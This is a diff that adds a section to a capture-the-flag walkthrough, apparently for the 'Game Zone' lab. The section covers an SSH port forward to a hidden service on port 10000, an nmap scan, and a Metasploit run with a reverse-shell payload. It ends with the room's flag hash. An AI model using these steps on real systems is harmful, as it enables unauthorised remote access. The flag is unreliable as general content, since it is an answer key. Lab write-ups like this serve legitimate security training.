@@ -156,3 +156,49 @@ Let's use this credentials to log in `ssh`
 ```
 
 
+![](../../0.%20Assets/Game%20Zone-1784730083655.webp)
+
+We can see there is a weird port open `10000`
+
+Let's use `reverse ssh tunels` to see what's behind the port
+
+```
+ssh -N -L 10000:localhost:10000 agent47@10.130.175.208
+```
+
+while this is open look for
+
+```
+http://localhost:10000
+```
+
+![](../../0.%20Assets/Game%20Zone-1784730531611.webp)
+
+I did an nmap to figure out what this is
+
+![](../../0.%20Assets/Game%20Zone-1784730651469.webp)
+
+
+And we search for exploits in `metasploit`
+
+![](../../0.%20Assets/Game%20Zone-1784730707191.webp)
+
+
+```
+show payloads
+set payload cmd/unix/reverse
+set lhost tun0
+set lport 4444
+set ssl false
+run
+```
+
+![](../../0.%20Assets/Game%20Zone-1784730893442.webp)
+
+![](../../0.%20Assets/Game%20Zone-1784730900537.webp)
+
+![](../../0.%20Assets/Game%20Zone-1784730914941.webp)
+
+```
+a4b945830144bdd71908d12d902adeee
+```
